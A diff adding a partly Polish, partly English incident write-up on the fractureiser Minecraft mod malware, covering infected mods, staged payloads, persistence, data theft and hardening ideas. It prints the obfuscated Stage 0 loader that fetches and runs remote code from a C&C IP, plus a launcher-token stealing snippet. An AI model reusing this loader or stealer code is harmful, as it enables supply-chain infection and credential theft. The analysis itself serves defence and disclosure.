@@ -1,0 +1,367 @@
+# Informacje Techniczne
+
+## Dystrybucja
+
+Niektóre paczki z modami dostały aktualizacje bez wiedzy oryginalnych autorów, dodając szkodliwy kod. Te aktualizacje zostały od razu zarchiwizowane po wysłaniu, co oznacza *że nie widać ich na stronie, tylko poprzez API.*
+
+Szkodliwy kod zawarty w aktualizacjach ma date wysłania wynoszącą kilka tygodni wstecz.
+Większość z nich zostało wysłane przez konta jednorazowego użytku z automatycznie wygenerowanymi nazwami, i najprawdopodobniej były przekazującymi infekcje.
+Luna Pixel Studios zostało zarażone przez dewelopera testującego jednego z tych modów, ponieważ zaciekawił się nowymi plikami.
+
+### Znane zainfekowane mody i pluginy
+
+Notka: ta lista **nie jest pełna**. Została zrobiona we wczesnych dniach dochodzenia i szybko
+doszliśmy do wniosku że skala tej operacji jest o wiele większa niż oryginalnie zakładaliśmy,
+powodując iż wymienianie pojedyńczych przypadków jest bezcelowe. Lista zostaje tutaj dla potrzeb archiwalnych.
+
+Zobacz również
+[liste od CurseForge](https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/)
+o zainfekowanych projektach.
+
+|mod/plugin|link(i)|SHA1|"Wysyłający"|
+|---|---|---|---|
+|Skyblock Core|[www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565](https://www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565) |`33677CA0E4C565B1F34BAA74A79C09A3B690BF41`|Luna Pixel Studios|
+|Dungeonz|[legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100 (usunięto)](https://legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100) |`2DB855A7F40C015F8C9CA7CBAB69E1F1AAFA210B`|fractureiser|
+|Haven Elytra|[dev.bukkit.org/projects/havenelytra/files/4551105 (usunięto)](https://dev.bukkit.org/projects/havenelytra/files/4551105)   [legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105 (usunięto)](https://legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105) |`284A4449E58868036B2BAFDFB5A210FD0480EF4A`|fractureiser|
+|Vault Integrations|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (usunięto)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simpleharvesting82|
+|AutoBroadcast|[www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257 (usunięto)](https://www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257)|`C55C3E9D6A4355F36B0710AB189D5131A290DF26`|shyandlostboy81|
+|Museum Curator Advanced|[www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353 (usunięto)](https://www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353)|`32536577D5BB074ABD493AD98DC12CCC86F30172`|racefd16|
+|Vault Integrations Bug fix|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (usunięto)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simplyharvesting82
+|Floating Damage|[dev.bukkit.org/projects/floating-damage (usunięto)](https://dev.bukkit.org/projects/floating-damage)|`1d1aaccdc13244e980c0c024610ecc77ea2674a33a52129edf1bb4ce3b2cc2fc`|mamavergas3001
+|Display Entity Editor|[www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122 (usunięto)](https://www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122)|`A4B6385D1140C111549D95EAB25CB51922EEFBA2`|santa_faust_2120
+
+Darkhax również wysłał to: https://gist.github.com/Darkhax/d7f6d1b5bfb51c3c74d3bd1609cab51f
+
+potencjalnie więcej modów: Sophisticated Core, Dramatic Doors, Moonlight lib, Union lib
+
+## Etap 0 (zainfekowane pliki .jar modów)
+
+Zainfekowane mody lub pluginy mają nową metodę `static void` wszczepioną w ich główną klase, oraz zawołanie tej metody jest wszczepione w statyczny inicjator tej klasy. W przypadku DungeonZ, metoda nazywa się `_d1385bd3c36f464882460aa4f0484c53` i istnieje w `net.dungeonz.DungeonzMain`. Dla Skyblock Core, metoda się nazywa `_f7dba6a3a72049a78a308a774a847180` i jest wszczepiona do `com.bmc.coremod.BMCSkyblockCore`. Dla HavenElytra, kod jest wszczepiony prosto do normalnie nieużywanego statycznego inicjatora od `valorless.havenelytra.HavenElytra`.
+
+Kod metody jest zaszyfrowany, używa `new String(new byte[]{...})` zamiast literali stringów.
+
+Tutaj przykład, "Create Infernal Expansion Plus", kopia "Create Infernal Expansion Compat" z wszczepionym wirusem do głównej klasy moda:
+```java
+static void _1685f49242dd46ef9c553d8af1a4e0bb() {
+  Class.forName(new String(new byte[] {
+      // "Utility"
+    85, 116, 105, 108, 105, 116, 121
+  }), true, (ClassLoader) Class.forName(new String(new byte[] {
+      // "java.net.URLClassLoader"
+    106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114
+  })).getConstructor(URL[].class).newInstance(new URL[] {
+    new URL(new String(new byte[] {
+        // "http"
+      104, 116, 116, 112
+    }), new String(new byte[] {
+        // "85.217.144.130"
+      56, 53, 46, 50, 49, 55, 46, 49, 52, 52, 46, 49, 51, 48
+    }), 8080, new String(new byte[] {
+        // "/dl"
+        47, 100, 108
+        }))
+  })).getMethod(new String(new byte[] {
+      // "run"
+    114, 117, 110
+  }), String.class).invoke((Object) null, "-114.-18.38.108.-100");
+}
+```
+
+To:
+1. Tworzy nową instancje `URLClassLoader` z adresem URL `http://[85.217.144.130:8080]/dl` ([shodan](https://www.shodan.io/host/85.217.144.130))
+2. Ładuje klase `Utility` z czytnika klas, pobierając kod z internetu
+3. Wywołuje metode `run` na `Utility`, przekazując jako argument String który jest inny dla każdego moda (!). Przykłady: 
+    * Skyblock Core: "`-74.-10.78.-106.12`"
+    * Dungeonz: "`-114.-18.38.108.-100`"
+    * HavenElytra: "`-114.-18.38.108.-100`"
+    * Vault Integrations: "`-114.-18.38.108.-100`"
+
+Przekazane liczby są traktowane jako bajty przez Etap 1, i są wpisywane to pliku nazwanego `.ref`. Pliki te są prawdopodobnie stworozne aby autor mógł śledzić źródła infekcji.
+
+Tworzenie czytnika klas jest statyczne dla tego adresu URL i nie używa adresu Cloudflare którego używa Etap 1. Z powodu iż te IP jest aktualnie offline, to oznacza że mody zainfekowane Etapem 0 (*a przynajmnniej te o którym nam wiadomo*) na ten moment nie rozprzestrzeniają infekcji.
+
+## Etap 1 (`dl.jar`)
+
+SHA-1: `dc43c4685c3f47808ac207d1667cc1eb915b2d82`
+
+[Zdekompilowane wersje wirusa mogą być znalezione tutaj](../decomp).
+
+Pierwsze co robi `Utility.run` to sprawdzenie czy systemowa zmienna `neko.run` jest ustawiona. Jeżeli jest, program *od razu zostanie poddany terminacji*. Jeżeli nie, ustawia tą zmienną na pusty string i kontynuuje. Wygląda to na że wirus chce się upewnić że nie odpala się kilka razy, np. w sytuacji gdzie zainfekował kilkanaście modów. *Nie możemy na tym polegać jako ochrone przed wirusem, ponieważ Etap 1 jest pobierany z Internetu i może się zmienić.*
+
+Wirus próbuje skontaktować się z `85.217.144.130`, i z domeną od Cloudflare Pages (`https://files-8ie.pages.dev/ip`). Zgłoszenia nadużycia zostały już wysłane. Domena Pages jest używana aby zdobyć IP serwera C&C jeżeli pierwszy adres nie odpowiada - ten link odpowiada z adresem IPv4 w formacie binarnym.
+
+*IP serwera C&C zostało zniwelowane po wysłanym zgłoszeniu do jego dostawcy. Musimy mieć na oku storne od Cloudflare aby zobaczyć czy nowy serwer C&c się pojawił, zakładam że nie mieli tego w planach*. Dziękuje Ci Serverion za twoją odpowiedź.
+
+*Domena Cloudflare Pages została poddana terminacji.* Istnieje nowy serwer C&C na IP `107.189.3.101`.
+
+Etap 1 następnie próbuje ostać się na systemie poprzez:
+1. Pobranie Etapu 2 (lib.jar na Linuxie, libWebGL64.jar na Windowsie) z serwera
+2. Wrzucenie Etapu 2 do cyklu startowego:
+* Na Linuxie, stara się wsadzić pliki systemd w `/etc/systemd/system` lub `~/.config/systemd/user`
+  * Plik który wrzucany jest do folderu `user` nigdy nie będzie działał, ponieważ próbuje użyć `multi-user.target`, który nie istnieje w `user`.
+* Na Windowsie, stara się zmodyfikować rejestr 
+  (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`), a jeżeli to się nie uda, 
+  próbuje dodać siebie do folderu `Windows\Start Menu\Programs\Startup`
+
+## Stage 2 (`lib.jar` or `libWebGL64.jar`)
+
+Known sha1 hashes:
+* `52d08736543a240b0cbbbf2da03691ae525bb119`
+* `6ec85c8112c25abe4a71998eb32480d266408863` (D3SL's earlier upload)
+
+Stage 2 is obfuscated with a demo version of the Allatori obfuscator, and its main class is called `Bootstrap`.
+It additionally contains another class called named `h` which seems to be a simple communications class, but is empty
+otherwise. You can view an attempt to reconstruct the source code at
+https://gist.github.com/SilverAndro/a992f85bec29bb248c354ccf5d2206fe
+
+When launched it does the following:
+1. Open port `9655` and add a shutdown hook to close it when the jvm closes.
+2. Locate itself on disk and works next to itself
+3. If `.ref` exists, it reads the identifier key from the file
+4. Launches a loop to
+    1. Checks with `https://[files-8ie.pages.dev]:8083/ip` for the server and attempts to connect to it
+    2. Receives a flag for if the update check should continue, throwing if not (reported to the server on port `1338`)
+    3. If so, receives a hash and checks it against `client.jar` if it exists, sending back a byte for if it wants to update
+    4. If so, receives and overwrites/creates `client.jar`, hiding it using file attributes
+    5. Loads and invokes the static method `dev.neko.nekoclient.Client#start(InetAddress, refFileBytes)`
+    6. Sleeps for 5 seconds
+
+## Stage 3 (`client.jar`)
+
+sha-1: `c2d0c87a1fe99e3c44a52c48d8bcf65a67b3e9a5`
+sha-1: `e299bf5a025f5c3fff45d017c3c2f467fa599915`
+
+`client.jar` is an incredibly obfuscated and complex bundle of code and contains both java and native code.
+
+It contains a native payload `hook.dll`, decompiled: https://gist.githubusercontent.com/NotNite/79ab1e5501e1ef109e8030059356b1b8/raw/c2102bf5ff74275ac44c2200d5121bfff652fd49/hook.dll.c
+
+There are two native functions meant to be called from Java, as they are JNI callable:
+* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveClipboardFiles(__int64 a1);`
+* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveMSACredentials(__int64 a1);`
+
+From analysis, these do what they say on the tin:
+* Read clipboard contents
+* Steal Microsoft account credentials
+
+There is also evidence of code attempting to do the following:
+* Scan for *all* jar files on the system that look like Minecraft mods (by detecting
+  Forge/Fabric/Quilt/Bukkit), or [declare a Main
+  class](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244)
+  (most plain Java programs) and attempt to inject Stage 0 into them
+* Steal cookies and login information for many web browsers
+* Replace cryptocurrency addresses in the clipboard with alternates that are presumably owned by the attacker
+* Steal Discord credentials
+* Steal Microsoft and Minecraft credentials, from a variety of launchers
+* Steal crypto wallets
+
+Jars are heuristically detected as Minecraft mods or plugins as follows:
+* Forge (`dev/neko/e/e/e/A`): The malware attempts to locate the `@Mod` annotation, which is required in every mod
+* Bukkit (`dev/neko/e/e/e/C`): The malware checks if a class extends Bukkit's `JavaPlugin` class
+* Fabric/Quilt (`dev/neko/e/e/e/i`): The malware checks if a class implements `ModInitializer`
+* Bungee (`dev/neko/e/e/e/l`): The malware checks if a class extends Bungee's `Plugin` class
+* Vanilla (`dev/neko/e/e/e/c`): The malware checks if the main client class `net.minecraft.client.main.Main` exists
+
+## Stage3 (`unobf-client.jar`)
+
+Around 2023-06-07 14:20 UTC the stage3 client jar was seemingly accidentally replaced with an unobfuscated version. You can find the archive here: https://github.com/clrxbl/NekoClient
+
+This validates the suspected behavior/evidence from the analysis done on the prior obfuscated `client.jar` sample.
+
+### Replication
+
+Replication is handled through automatic processing of classes in jar files across the entire filesystem on the local machine. Any jar file that contains classes meeting certain critera is subject for infection. The process of scanning the local file system and injecting malicious code can be found here: [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L273)
+
+The critera that the process looks for can be found here: [`dev/neko/nekoinjector/template/impl`](https://github.com/clrxbl/NekoClient/tree/main/dev/neko/nekoinjector/template/impl)
+
+* `BungeecordPluginTemplate` looks for the interface `net/md_5/bungee/api/plugin/Plugin` in classes
+* `FabricModTemplate` looks for the interface `net/fabricmc/api/ModInitializer` in classes
+* `ForgeModTemplate` looks for the annotation `net/minecraftforge/fml/common/Mod` in classes
+* `MinecraftClientTemplate` looks for the existence of `net/minecraft/client/main/Main.class` and `net/minecraft/client/gui/GuiMultiplayer.class` in the jar 
+* `SpigotPluginTemplate` looks for the super-type `org/bukkit/plugin/java/JavaPlugin` in classes
+* If none of the above match the class, [it will attempt to infect the main class of the jar file](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244) - if one exists.
+
+The malicious code injected is the backdoor logic seen in Stage0. The way that injection works is that the malicious code is declared in the `Loader` class in a static method. The `Injector` class that is adjacent to it is responsible for extracting the code from `Loader` and inserting it into new classes targeted for infection. The return value of `Injector.loadInstallerNode(...)` is a `MethodNode` outlining the infection process itself. Now they just need to add that method to the targeted class. Back in the [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L272) they call `Entry.inject(MethodNode)` to achive this. To ensure the malicious method is invoked this `inject` method adds logic to the targeted class's static initializer that invokes the added method. Since the static initializer is run when the class first loads, and the target class is a plugin/mod the assumption is this code will always be triggered by users who run infected modpacks or servers. After this, they repackage the jar with the newly infected target class.
+
+### Anti-sandbox tricks
+
+Something not commonly seen in JVM malware that is present here is a class titled `VMEscape`. It checks if its in [Windows Sandbox](https://learn.microsoft.com/en-us/windows/security/application-security/application-isolation/windows-sandbox/windows-sandbox-overview) by checking if the current user is `WDAGUtilityAccount`. If this condition is met, an attempt to escape Windows Sandbox is made.
+
+The process is roughly as follows:
+
+- Start a repeating thread to run the following actions:
+  - Create a temporary directory using `Files.createTempDirectory(...)`
+  - Iterate over `FileDescriptor` entries in the system clipboard which mirrors the hosts clipboard 
+  - Create a shortcut that looks like the original file _(using icons from SHELL32)_ but instead invokes the malware
+  - Assings this shortcut to the clipboard, overwriting the original file reference
+
+Thus, if a user copies a file and goes to paste it elsewhere they will instead paste a shortcut that looks like their intended file, but actually runs the malware.
+
+### Data theft
+
+**MSA Tokens**: Since this mod is targeting Minecraft mods, it's only natural to attempt to steal the MSA token used to login to Minecraft with. Some launchers keep this data in a local file, which this malware will attempt to read from. This affects a variety of launchers such as:
+
+* The vanilla/mojang launcher
+* The legacy vanilla/mojang launcher
+* PolyMC / Prism
+* Technic
+* Feather
+* LabyMod (< v3.9.59)
+* And any MSA token found in the [Windows Credential Manager](https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0)
+
+The retrival logic (Seen in [`dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java)) looks similar across a number of items since they store this data in a similr way. For example here is the laby-mod code:
+```java
+private static void retrieveRefreshTokensFromLabyMod(List<RefreshToken> refreshTokens) throws IOException {
+	String appdata = System.getenv("APPDATA");
+	if (Platform.isWindows() || Objects.isNull(appdata)) {
+		Path path = appdata == null ? null : Paths.get(appdata, ".minecraft", "LabyMod", "accounts.json");
+		if (Files.isReadable(path)) {
+			extractRefreshTokensFromLabyModLauncher(refreshTokens, Json.parse(Files.readString(path)).asObject());
+		}
+	}
+}
+```
+The code for retrieving tokens from Feather/PolyMC/Prism are essentially identical.
+
+The change from this strategy to the vanilla launchers is that the Json has an additional layer of cryptography protecting it.
+
+The change from this strategy to technic is that technic stores credentials using Java's built-in object serialization, wrapping the `com.google.api.client.auth.oauth2.StoredCredential` type.
+
+**Discord tokens**: Everyone's seen a token-stealer before. Steals token and extra information such as payment methods, linked phone number, etc. Affects the standard client, canary, ptb, and lightcord clients. Relevant source: [`dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java`](https://github.com/clrxbl/NekoClient/blob/fd76c5f9d40d1e10de11f00a6b4e0cca3d6221a3/dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java)
+
+**Cookies & Saved credentials**: Steals saved cookies and login credentials saved in affected browsers.  Relevant source: [`dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java)
+
+- Mozilla Firefox
+  - Waterfox
+  - Pale Moon
+  - SeaMonkey
+- Chrome
+  - Edge
+  - Brave
+  - Vivaldi
+  - Yandex
+  - Slimjet
+  - CentBrowser
+  - Comodo
+  - Iridium
+  - UCBrowser
+  - Opera
+    - Beta
+    - Developer
+    - Stable
+    - GX
+    - Crypto
+  - CryptoTab
+
+## Stage 3b (`dummyloader3.jar`)
+
+Stage 3 was replaced with another jar some time after the second C&C server was stood up.
+
+It appears to be just the SkyRage updater, which is another minecraft malware targetting blackspigot.
+
+### Persistence
+- Windows: task scheduler `MicrosoftEdgeUpdateTaskMachineVM`, file `%AppData%\..\LocalLow\Microsoft\Internet Explorer\DOMStore\microsoft-vm-core`
+- Linux: `/bin/vmd-gnu`, `/etc/systemd/system/vmd-gnu.service`, service `vmd-gnu`
+
+### Connections
+- C&C server: `connect.skyrage.de`
+- Downloading: `hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/qqqqqqqqq`
+
+### Actions
+- `qqqqqqqqq` jar extracts all kinds of information (browser cookies, discord, minecraft, epic games, steam login, also some stuff about crypto wallets and password pamangers), which update jar uploads to C&C server
+- replaces crypto coin addresses in clipboard with address recieved from `95.214.27.172:18734`
+- persistence (see above)
+- contains auto-updater, current version is 932 (`hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/version`)
+
+### Mappings
+
+These are the mappings for this sample, which can be applied via Enigma or another tool supporting Engima mappings.
+```
+CLASS D Chat
+CLASS E ChatChain
+CLASS E$a ChatChain$ChainLink
+CLASS F ClientChat
+CLASS G EncryptionRequest
+CLASS H EncryptionResponse
+CLASS H$a EncryptionResponse$EncryptionData
+CLASS J KeepAlive
+CLASS L LoginPayloadResponse
+CLASS O PluginMessage
+CLASS O$1 BungeeCordProtocolVersionMapFunction
+CLASS P SetCompression
+CLASS R StatusResponse
+CLASS T CryptocurrencyClipboardLogger
+CLASS T$1 CryptocurrencyClipboardLogger$LowLevelKeyboardHook
+CLASS U AutoRunPersistence
+CLASS V InputStreamFileWriter
+CLASS W OperatingSystem
+CLASS X AutoUpdater
+CLASS Y StacktraceSerializer
+CLASS a MalwareClientConnectionHandler
+CLASS b Main
+    FIELD a intconst I
+    FIELD a string0 Ljava/lang/String;
+    FIELD a ipAddress Ljava/net/InetSocketAddress;
+CLASS g MinecraftBot
+CLASS h MinecraftBot2
+CLASS o MinecraftFriendlyByteBuf
+CLASS s MinecraftIPAddressResolver
+CLASS t MinecraftPacketDecoder
+CLASS y MinecraftPacketEncryption
+```
+
+### Anti-decompilation
+
+This sample appears to abuse technicalities in the class-file to crash decompiler tools. Such exploits can be fixed using [CAFED00D](https://github.com/Col-E/CAFED00D), a bytecode parser that filters out malformed attributes. After this, the only remaining hassle is basic obfuscation applied by Allatori demo.
+
+# Other Stuff
+
+More details are available in the live stage-3 reversal doc: https://hackmd.io/5gqXVri5S4ewZcGaCbsJdQ
+
+When the second C&C server was stood up, a deobfuscated version of stage 3 was
+accidentally served for around 40 minutes.
+
+The main payload server ~~is~~ *was* (got taken down) hosted on Serverion, a company based in the Netherlands.
+
+The new C&C has been taken down as well. _2023-06-07 18:51 UTC_
+
+Other than an HTTP server on port 80/443 and an SSH server on port 22, the following ports were open on `85.217.144.130` and `107.189.3.101`:
+
+* 1337
+* 1338 (a port referenced in Stage 1's file for creating new Debugger connection)
+* 8081 (this is a WebSocket server - no apparent function right now, not referenced in any malicious code)
+* 8082 (nobody's gotten anything out of this one,  not referenced in any malicious code)
+* 8083 (contacted by Stage 1)
+
+Curiously, fractureiser's bukkit page says "Last active Sat, Jan, 1 2000 00:00:00" https://dev.bukkit.org/members/fractureiser/projects/
+
+## Samples
+
+Please ask in the IRC chat for read or read/write access to samples. Source code of the decompiled Stage 3 client is available: https://github.com/clrxbl/NekoClient
+
+## Follow-Ups
+While it's a bit early to speak of long term follow-ups, this whole debacle has brought up several critical flaws in the modded Minecraft ecosystem. This section is just brainstorming on them and how we can improve.
+
+#### 1. Review at mod repositories is inadequate
+
+What exactly does CurseForge and Modrinth do when "reviewing" a mod? We should know as a community, instead of relying on security through obscurity.
+Should be we be running some sort of static analysis? (williewillus has a few ideas here)
+
+#### 2. A lack of code signing for mods
+
+Unlike the software industry at large, mods released and uploaded to repositories are usually not signed with a signing key that proves that the owner of the key uploaded the mod. Having signing and a separate key distribution/trust mechanism mitigates CurseForge accounts getting compromised.
+
+However, this then leads to the greater issue of how to derive key trust, as the fact that "this jar has this signature" has to be communicated out of band from CurseForge/Modrinth, in a standard way so that loaders or users can verify the signatures.
+Forge tried to introduce signing many years ago and it had limited uptake.
+
+#### 3. A lack of reproducible builds
+
+Minecraft toolchains are a mess, and builds are usually not reproducible. It is common to have buildscripts fetching unpinned -SNAPSHOT versions of random Gradle plugins and using them, which results in artifacts that are non-reproducible and thus non-auditable.
+
+A random Gradle plugin being a future attack vector is not out of the question.
+
+#### 4. Lack of sandboxing of Minecraft itself
+
+Java edition modding has always had the full power of Java, and this is the other side of that double-edged sword: malicious code has far-reaching impact.
+Minecraft itself is not run with any sandboxing, and servers usually are not sandboxed unless the owner is knowledgeable enough to do so.
+
+Good sandboxing is difficult, especially on systems such as Linux where SELinux/AppArmor have such poor UX that no one deploys them.
